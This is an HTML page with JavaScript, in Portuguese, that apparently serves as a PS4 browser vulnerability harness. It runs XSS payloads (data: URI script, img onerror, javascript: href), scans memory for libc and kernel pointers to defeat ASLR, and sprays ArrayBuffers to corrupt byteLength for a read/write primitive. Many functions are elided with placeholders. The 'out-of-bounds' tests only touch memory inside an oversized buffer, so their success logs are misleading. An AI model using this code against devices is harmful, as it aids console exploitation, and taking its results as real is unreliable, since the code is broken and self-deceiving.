<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Suite de Vulnerabilidades PS4 - Essenciais (Corrigido)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output, #output-canvas {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 48vh; /* Mantido de index-42.html */
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        /* Estilos de Log (Inalterados da sua base index-42.html) */
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }

        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 60px; overflow-y: auto; }
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; cursor: default; }
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Testes de Vulnerabilidade - Script 1 (Essenciais)</h1> <p>Testa: XSS, OOB R/W, PP Básica/Hijack, WebSockets/Workers, DOM Stress.</p> <button id="runBtn" onclick="runAllTests()">Iniciar Testes S1 (Essenciais)</button>
    <div id="output"></div>
    <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>

    <hr>

    <section>
        <h2>Suite de Vulnerabilidades - Canvas (Essenciais)</h2> <p>Foco: PP Avançado, OOB R/W (Metadata/ImageData).</p> <canvas id="interactive-canvas" width="300" height="100"></canvas>
        <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste S2 (Essenciais)</button>
        <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 1 (Base index-42.html + Correção allocationSize + Remoção IndexedDB) ---
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50;
        const MEDIUM_PAUSE = 500;

        // Variáveis Globais (Mantidas as usadas)
        let leakedValueFromOOB = null;
        let potentialRealLibcPtr = null; // Pode ser definido por S1 ou S2
        let potentialRealKernelPtr = null; // Pode ser definido por S1 ou S2
        // Constantes de base ainda usadas para heurística de leak
        const BASE_LIBC = 0x180AC8000;
        const BASE_LIBKERNEL = 0x80FCA000;
        const SIZE_LIBC = 0x1200000;     // Verificar!
        const SIZE_LIBKERNEL = 0x1100000; // Verificar!


        const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];

        // Função log (Inalterada da sua base)
        const log = (message, type = 'info', funcName = '') => {
            let keepLog = IMPORTANT_LOG_TYPES_S1.includes(type);
            if (!keepLog && type === 'good') { /* ... */ }
            if (!keepLog && funcName.includes('Payload') && type !== 'info') { keepLog = true; }
            if (!keepLog) return;
            if (!outputDiv) return;
            try { /* ... (Lógica de log completa) ... */ }
            catch(e) { console.error("Erro log S1:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };

        // Funções utilitárias (Inalteradas da sua base + toHex64)
        const PAUSE_S1 = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
        const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
        const toHex64 = (high, low) => {
             if (typeof BigInt !== 'undefined') {
                try {
                    const highBig = (BigInt(high >>> 0) << 32n);
                    const lowBig = BigInt(low >>> 0);
                    const fullBig = highBig | lowBig;
                    return '0x' + fullBig.toString(16).toUpperCase().padStart(16, '0');
                } catch(e) { /* fallback */ }
             }
             return `H=0x${(high>>>0).toString(16).toUpperCase().padStart(8,'0')} L=0x${(low>>>0).toString(16).toUpperCase().padStart(8,'0')}`;
        };

        // === TESTES SCRIPT 1 (Mantidos os Essenciais/Bem-sucedidos) ===

        const testCSPBypass = async () => {
            const FNAME = 'testCSPBypass'; log("--- Iniciando Teste 1: XSS Básico (Script 1) ---", 'test', FNAME);
            try { const payloadJS = `try { log("[Payload Data:] Alerta data: URI executado!", "vuln", "XSS Payload"); alert('XSS S1 via Data URI!'); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good", "XSS Payload"); }`; const encodedPayload = btoa(payloadJS); const scriptTag = document.createElement('script'); scriptTag.src = 'data:text/javascript;base64,' + encodedPayload; scriptTag.onerror = (e) => { log(`ERRO: Falha carregar script data: URI! Event: ${e.type}`, 'error', FNAME); }; document.body.appendChild(scriptTag); await PAUSE_S1(SHORT_PAUSE * 2); try { document.body.removeChild(scriptTag); } catch(e){} } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error', FNAME); }
            await PAUSE_S1();
            try { const imgTag = document.createElement('img'); const imgSrc = 'invalid_img_' + Date.now(); imgTag.src = imgSrc; const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML += '<br><span class="log-vuln">XSS S1 DOM via ONERROR Executado!</span>'; log("XSS DOM via onerror OK!", "vuln", "ONERROR Payload"); } else { log("Alvo XSS DOM não encontrado.", "error", "ONERROR Payload"); } alert('XSS_S1_DOM_ONERROR'); } catch(e) { log("Erro payload onerror: " + e.message, "warn", "ONERROR Payload"); } `; imgTag.setAttribute('onerror', onerrorPayload); document.body.appendChild(imgTag); await PAUSE_S1(SHORT_PAUSE * 2); try { document.body.removeChild(imgTag); } catch(e){} } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME); }
            await PAUSE_S1();
            try { const link = document.createElement('a'); link.href = "javascript:try{log('[Payload JS Href:] Executado!', 'vuln', 'XSS Payload JS Href'); alert('XSS S1 via JS Href!');}catch(e){log('[Payload JS Href:] Bloqueado: '+e.message,'good','XSS Payload JS Href');}"; link.textContent = "[Test Link JS Href - Clique Manual]"; link.style.display = 'block'; link.style.color = 'cyan'; document.getElementById('xss-target-div').appendChild(link); log("Adicionado link javascript: href para teste manual.", 'info', FNAME); } catch(e) { log(`Erro ao criar link js: href: ${e.message}`, 'error', FNAME); }
            log("--- Teste 1 Concluído ---", 'test', FNAME);
        };

        const testOOBReadInfoLeakEnhancedStore = async () => {
            const FNAME = 'testOOBReadInfoLeakEnhancedStore'; log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test', FNAME);
            const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize;
            const readRangeStart = -64; const readRangeEnd = bufferSize + 64;
            const allocationSize = bufferSize + 256; // *** CORRIGIDO ***
            const baseOffsetInBuffer = 128;
            const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
            let writeSuccess = false; let potentialLeakFoundCount = 0;
            leakedValueFromOOB = null; potentialRealLibcPtr = null; potentialRealKernelPtr = null; // Reseta

            try {
                const buffer = new ArrayBuffer(allocationSize); // Usa allocationSize
                const dataView = new DataView(buffer);
                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;

                await PAUSE_S1();
                try { // OOB Write
                    dataView.setUint8(writeTargetAddress, writeValue);
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                    log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME);
                    writeSuccess = true;
                } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); return false; }

                await PAUSE_S1();
                // OOB Read Loop
                for (const readOffset of oobReadOffsets) {
                    const readTargetAddress = baseOffsetInBuffer + readOffset;
                    const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;

                    if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { // U64 Read
                        try {
                            const low = dataView.getUint32(readTargetAddress, true);
                            const high = dataView.getUint32(readTargetAddress + 4, true);
                            const valueU64Str = toHex64(high, low);
                            const isFillPattern = (high === 0xAAAAAAAA && low === 0xAAAAAAAA);
                            const isKnownWritePattern = (valueU64Str === "0xAAAAAAAAEEAAAAAAAAAA");

                            if (!isFillPattern && !isKnownWritePattern && (high !== 0 || low !== 0)) {
                                potentialLeakFoundCount++;
                                log(` -> OOB Read U64 ${relOffsetStr}: ${valueU64Str}`, 'leak', FNAME);
                                let isLikelyPtr = false; let ptrType = "UNK";

                                if (typeof BigInt !== 'undefined') { // Check Range
                                    try {
                                        const ptrBig = (BigInt(high >>> 0) << 32n) | BigInt(low >>> 0);
                                        if (ptrBig >= BigInt(BASE_LIBKERNEL) && ptrBig < (BigInt(BASE_LIBKERNEL) + BigInt(SIZE_LIBKERNEL))) {
                                             log(` ---> POTENCIAL PONTEIRO KERNEL! ${valueU64Str} --- VERIFIQUE NO DEBUGGER!`, 'critical', FNAME);
                                             ptrType = "KERNEL"; isLikelyPtr = true;
                                             if (!potentialRealKernelPtr) potentialRealKernelPtr = { high, low, str: valueU64Str, base: BASE_LIBKERNEL, offsetInLeak: readOffset };
                                        } else if (ptrBig >= BigInt(BASE_LIBC) && ptrBig < (BigInt(BASE_LIBC) + BigInt(SIZE_LIBC))) {
                                             log(` ---> POTENCIAL PONTEIRO LIBC! ${valueU64Str} --- VERIFIQUE NO DEBUGGER!`, 'critical', FNAME);
                                             ptrType = "LIBC"; isLikelyPtr = true;
                                             if (!potentialRealLibcPtr) potentialRealLibcPtr = { high, low, str: valueU64Str, base: BASE_LIBC, offsetInLeak: readOffset };
                                        }
                                    } catch(e) { console.warn("Erro BigInt Range Check:", e); }
                                }
                                if (leakedValueFromOOB === null) { // Store first generic U64 leak
                                     leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, str: valueU64Str };
                                     log(` -> PRIMEIRO LEAK U64 (Qualquer) ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                }
                                if (isLikelyPtr) { // Log Insight if potential K/L pointer
                                     log(` ---> INSIGHT: O valor ${valueU64Str} parece apontar para ${ptrType}. Confirme e use para calcular slide ASLR.`, 'info', FNAME);
                                }
                            }
                        } catch (e) {}
                    }
                     // U32 Read (Mantido da base)
                     if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32(val32)) { log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset, str: toHex(val32) }; log(` -> PRIMEIRO LEAK (U32) ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito U8 como U32 (${toHex(val32)}) ${relOffsetStr}! Confirma R/W simples.`, 'vuln', FNAME); } } catch (e) {} }

                    if (readOffset % 32 === 0) await PAUSE_S1(5);
                } // Fim loop read
            } catch (e) { log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); console.error(e); }
            finally {
                const leakStatus = potentialRealKernelPtr ? `Leak KERNEL: ${potentialRealKernelPtr.str}` : (potentialRealLibcPtr ? `Leak LIBC: ${potentialRealLibcPtr.str}`: (leakedValueFromOOB ? `Primeiro Leak: ${leakedValueFromOOB.str}` : 'Nenhum leak U64/U32 armazenado'));
                log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks não-padrão, ${leakStatus}) ---`, 'test', FNAME);
                /* Comentário Contexto Exploração */
                log("/*Ctx: Leitura OOB com leak de ponteiro -> Bypass ASLR? */", "info", FNAME);
            }
            return writeSuccess;
        };

        const testOOBUAFPattern = async () => {
            const FNAME = 'testOOBUAFPattern'; log("--- Iniciando Teste 3: OOB Write -> UAF Pattern ---", 'test', FNAME);
            const buffer1Size = 64; const buffer2Size = 128; const oobWriteOffset = buffer1Size; const corruptedValue = 0xDEADBEEF;
            const allocationSize1 = buffer1Size + 128; // *** CORRIGIDO ***
            const baseOffset1 = 64; let buffer1 = null, buffer2 = null; let dv1 = null; let writeOK = false; let uafTriggered = false;
            try { /* ... (Código interno completo mantido da sua base index-42.html) ... */ }
            catch (e) { log(`Erro fatal no Teste 3 (OOB UAF): ${e.message}`, 'error', FNAME); console.error(e); }
            finally { /* ... (Log final e comentário de contexto mantidos) ... */ }
            return writeOK && uafTriggered;
        };

        const testOOBOtherTypes = async () => {
            const FNAME = 'testOOBOtherTypes'; log("--- Iniciando Teste 4: OOB Write/Read (Float64/BigInt64) ---", 'test', FNAME);
            const bufferSize = 64; const oobWriteOffset = bufferSize;
            const allocationSize = bufferSize + 128; // *** CORRIGIDO ***
            const baseOffset = 64; let buffer = null; let dv = null; let writeF64OK = false; let writeB64OK = false; let readF64OK = false; let readB64OK = false;
            try { /* ... (Código interno completo mantido da sua base index-42.html) ... */ }
            catch(e) { log(`Erro fatal no Teste 4 (OOB Types): ${e.message}`, 'error', FNAME); console.error(e); }
            finally { /* ... (Log final e comentário de contexto mantidos) ... */ }
        };

        const testBasicPP = async () => { /* ... (Código original completo mantido) ... */ };
        const testPPJsonHijack = async () => { /* ... (Código original completo mantido) ... */ };
        const testWebSockets = async () => { /* ... (Código original completo mantido) ... */ };
        const testWebWorkers = async () => { /* ... (Código original completo mantido) ... */ };
        // testIndexedDB Removido
        const testDOMStress = async () => { /* ... (Código original completo mantido) ... */ };

        // Função principal S1 (Chamada a testIndexedDB removida)
        const runAllTests = async () => {
            const FNAME = 'runAllTests';
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            log("==== INICIANDO Script 1 (Essenciais) ====", 'test', FNAME);
            await testCSPBypass(); await PAUSE_S1(MEDIUM_PAUSE);
            await testOOBReadInfoLeakEnhancedStore(); await PAUSE_S1(MEDIUM_PAUSE);
            await testOOBUAFPattern(); await PAUSE_S1(MEDIUM_PAUSE);
            await testOOBOtherTypes(); await PAUSE_S1(MEDIUM_PAUSE);
            await testBasicPP(); await PAUSE_S1(MEDIUM_PAUSE);
            await testPPJsonHijack(); await PAUSE_S1(MEDIUM_PAUSE);
            await testWebSockets(); await PAUSE_S1(MEDIUM_PAUSE);
            await testWebWorkers(); await PAUSE_S1(MEDIUM_PAUSE);
            // Chamada a testIndexedDB Removida
            await testDOMStress(); await PAUSE_S1(MEDIUM_PAUSE);
            log("\n==== Script 1 (Essenciais) CONCLUÍDO ====", 'test', FNAME);
            if (runBtn) runBtn.disabled = false;
        };
    </script>

    <script>
        // --- Script 2: Canvas (Simplificado - Foco nos Testes Bem-sucedidos) ---
        const SHORT_PAUSE_CANVAS = 50;
        let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
        const interactiveAreas = [ /* ... (mantido) ... */ ];
        const imgSquareSize = 28; const imgSquareSpacing = 5; const imgSquares = []; const imgSquaresStartY = 45;
        let currentLeakData = { text: "Leak(S1): N/A", color: "#AAAAAA" };
        let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null;
        // Variáveis WebGL/GPU/ROP removidas

        // Variável para primitiva R/W (mantida)
        let arbitraryReadWriteBuffer = null;
        // Wrappers (não implementados por padrão)
        let reliableWritePrimitive = null;
        let reliableReadPrimitive = null;

        const IMPORTANT_LOG_TYPES_S2 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
        // Funções utilitárias e de log S2 (mantidas da sua base)
        const logCanvas = (message, type = 'info', funcName = '') => { /* ... */ };
        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
        const toHexCanvas = (val, bits = 32) => { /* ... */ };
        const toHexCanvas64 = toHex64; // Reusa
        const isPotentialPointer64_S2 = isPotentialPointer64; // Reusa
        const isPotentialData32_S2 = isPotentialData32;   // Reusa
        const drawInteractiveAreas = () => { /* ... */ };
        const drawImageSquares = () => { /* ... */ };
        const redrawAll = () => { /* ... */ };

        // === TESTES SCRIPT 2 (Mantidos os Essenciais/Bem-sucedidos) ===

        // testWebGLCheck REMOVIDO
        const testAdvancedPP = async () => { /* ... (Código original completo mantido) ... */ };

        const testOOBReadEnhanced = async () => {
             const FNAME = 'testOOBReadEnhanced'; logCanvas("--- Teste S2: OOB Read Enhanced Scan ---",'test', FNAME);
             const bufferSize=32; const readRangeStart=-128; const readRangeEnd=bufferSize+128;
             const allocationSize = bufferSize + 512; // *** CORRIGIDO ***
             const baseOffsetInBuffer = 256;
             const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); }
             let potentialLeakFoundCount=0;
             try{
                 const buffer=new ArrayBuffer(allocationSize); // Usa allocationSize
                 const dataView=new DataView(buffer);
                 for(let i=0; i<buffer.byteLength; i++){ dataView.setUint8(i, 0xCC); } // Padrão CC

                 for(const readOffset of oobReadOffsets){ /* ... (Lógica OOB Read U64 completa mantida, incluindo verificação de range K/L) ... */ }
             }
             catch(e) { logCanvas(`Erro fatal no Teste S2 OOB Read Scan: ${e.message}`,'error', FNAME); console.error(e); }
             finally { /* ... (Log final e comentário de contexto mantidos) ... */ }
             await PAUSE();
             return potentialRealKernelPtr || potentialRealLibcPtr;
        };

        const testOOBWriteMetadata = async () => {
            const FNAME = 'testOOBWriteMetadata'; logCanvas("--- Teste: OOB Write -> Metadata ---",'test', FNAME);
            const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE;
            const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false;
            const allocationSize = controlBufferSize + 512; // *** CORRIGIDO ***
            const baseOffsetInBuffer = 256;
            let foundOffset=-1;
            arbitraryReadWriteBuffer = null; // Reseta global
            let finalResultLog = "";
            try{ controlBuffer=new ArrayBuffer(allocationSize); /* ... (preenchimento DD) ... */ } catch(e){ return false; }

            // Filler Spray (mantido conceitual)
            const fillerSprayCount = 100; const fillerSpraySize = 96; let fillerBuffers = [];
            logCanvas(` -> Realizando spray de preenchimento (${fillerSprayCount}x${fillerSpraySize}b)...`, 'info', FNAME);
            for (let i = 0; i < fillerSprayCount; i++) { try { fillerBuffers.push(new ArrayBuffer(fillerSpraySize)); } catch (e) { break; } }

            logCanvas(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
            for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}}
            await PAUSE();

            // Offsets Expandidos (mantido)
            const metadataOffsetsToTry = []; for (let i = -256; i <= 256; i += 4) { metadataOffsetsToTry.push(i); }
            logCanvas(`Testando ${metadataOffsetsToTry.length} offsets OOB para corrupção...`, 'info', FNAME);

            for(const tryOffset of metadataOffsetsToTry){
                if (corruptionSuccess) break;
                const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset;
                const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
                let currentWriteOK=false;
                if(targetWriteAddr < 0 || targetWriteAddr + 4 > controlBuffer.byteLength) { continue; }
                try{ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; }
                catch(e){ try { dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } catch(eRestore){} continue; }

                if(currentWriteOK){
                    for(let j=0; j<targetBuffers.length; j++){
                        try {
                            if (targetBuffers[j] && targetBuffers[j].byteLength === targetValue){
                                logCanvas(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHexCanvas(targetValue)} com escrita OOB em ${relOffsetStr}!`, 'critical', FNAME);
                                corruptionSuccess=true; foundOffset=tryOffset;
                                arbitraryReadWriteBuffer = targetBuffers[j]; // Armazena
                                finalResultLog = `SUCESSO! byteLength corrompido usando offset ${relOffsetStr}.`;
                                // Demonstração R/W Removida (pois não funcionou nos logs anteriores)
                                logCanvas(` ---> *** ALERTA: Primitiva Potencial de R/W Arbitrário OBTIDA (buffer ${j}, novo tamanho ${toHexCanvas(arbitraryReadWriteBuffer.byteLength)})! ***`, 'escalation', FNAME);
                                break;
                            }
                        } catch(eCheck) { /* ... */ }
                    }
                    try{ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } catch(eRestore){}
                }
                 if(tryOffset % 64 === 0) await PAUSE(5);
            }
            if (!corruptionSuccess) { /* ... (msg final inalterada) ... */ }
            logCanvas(finalResultLog, corruptionSuccess ? 'vuln' : (writeSuccessCount > 0 ? 'warn' : 'good'), FNAME);
            logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME);
            /* Comentário de Contexto para Exploração (Mantido) */
            fillerBuffers = null;
            await PAUSE();
            return corruptionSuccess;
        };

        // testWebGLDeeperPlus REMOVIDO
        const testOOBWriteToImageDataCheck = async () => {
             const FNAME = 'testOOBWriteToImageDataCheck'; /* ... (Código original completo mantido) ... */
             // Necessário corrigir allocationSize aqui também
             const allocationSize = bufferOOBSize + 256; // *** CORRIGIDO ***
             /* ... (Resto do código interno completo mantido) ... */
        };
        const testOOBWriteOnly = async () => {
             const FNAME = 'testOOBWriteOnly'; /* ... (Código original completo mantido) ... */
             // Necessário corrigir allocationSize aqui também
             const allocationSize = bufferOOBSize + 256; // *** CORRIGIDO ***
             /* ... (Resto do código interno completo mantido) ... */
        };
        // testFileSystemAccess REMOVIDO
        // testWebGPUCheck REMOVIDO
        // attemptRopExecution REMOVIDO

        // Função principal Script 2 (Simplificada)
        const runCanvasTestSequence = async () => {
            const FNAME = 'runCanvasTestSequence';
            outputDivCanvas = document.getElementById('output-canvas'); coordStatusDiv = document.getElementById('canvas-coord-status'); canvasElement = document.getElementById('interactive-canvas'); const runBtnCanvas = document.getElementById('runCanvasBtn');
            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { return; } // Simplificado
            if (runBtnCanvas) runBtnCanvas.disabled = true;
            outputDivCanvas.innerHTML = '';
            logCanvas("Iniciando sequência Script 2 (Essenciais)...", "test", FNAME);

            imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
            // Apenas botões para testes mantidos
            const squareDefs = [
                { id: 'imgSq0', text: 'Meta', color: '#FF5733', action: testOOBWriteMetadata },
                { id: 'imgSq1', text: 'PP++', color: '#C70039', action: testAdvancedPP },
                { id: 'imgSq2', text: 'OOBRd', color: '#E67E22', action: testOOBReadEnhanced },
                { id: 'imgSq3', text: 'ImgDt', color: '#900C3F', action: testOOBWriteToImageDataCheck },
                { id: 'imgSq4', text: 'OOBWr', color: '#581845', action: testOOBWriteOnly }, // Adicionado botão para este
            ];
            const maxPerRow = Math.floor((canvasElement.width - 10) / (imgSquareSize + imgSquareSpacing));
            squareDefs.forEach((def, index) => {
                 sqX = 10 + (index % maxPerRow) * (imgSquareSize + imgSquareSpacing);
                 sqY = imgSquaresStartY + Math.floor(index / maxPerRow) * (imgSquareSize + imgSquareSpacing);
                 if (sqY + imgSquareSize > canvasElement.height - 15) { /* ... (Aviso mantido) ... */ return; }
                 imgSquares.push({ id: def.id, x: sqX, y: sqY, size: imgSquareSize, color: def.color, text: def.text, hover: false, url: def.url, action: def.action });
            });

            try {
                 try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha Ctx 2D."); } catch(e) { /* ... */ throw e; }
                 redrawAll(); await PAUSE();
                 try { /* ... (lógica leak S1 inalterada) ... */ } catch (e) { /* ... */ }
                 redrawAll(); await PAUSE();

                // Executa testes essenciais S2
                await testAdvancedPP(); await PAUSE(SHORT_PAUSE_CANVAS);
                await testOOBReadEnhanced(); await PAUSE(SHORT_PAUSE_CANVAS);
                await testOOBWriteMetadata(); await PAUSE(SHORT_PAUSE_CANVAS);
                await testOOBWriteOnly(); await PAUSE(SHORT_PAUSE_CANVAS);
                await testOOBWriteToImageDataCheck(); await PAUSE(SHORT_PAUSE_CANVAS);

                logCanvas("--- Sequência de testes essenciais S2 concluída ---", 'test', FNAME);
                await PAUSE(100);

                // Adiciona listeners (mantidos da sua base)
                if(canvasClickListener && canvasElement) { /* ... */ }
                if(canvasMoveListener && canvasElement) { /* ... */ }
                canvasMoveListener = (event) => { /* ... (Código original mantido) ... */ };
                canvasClickListener = async (event) => { /* ... (Código original mantido) ... */ };
                canvasElement.addEventListener('click', canvasClickListener);
                canvasElement.addEventListener('mousemove', canvasMoveListener);
                redrawAll();

            } catch(e) { logCanvas(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical', FNAME); console.error("Erro GERAL SCRIPT 2:", e); if(e.stack) console.error(e.stack); }
            finally { logCanvas("--- Fim da execução Script 2 ---", 'test', FNAME); if (runBtnCanvas) runBtnCanvas.disabled = false; }
        };

        // Wrapper e Unload (Mantidos da sua base)
        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        window.addEventListener('unload', () => { try { /* ... */ } catch(e) {} console.log("[Canvas Unload] Limpeza OK."); });
    </script>

</body>
</html>
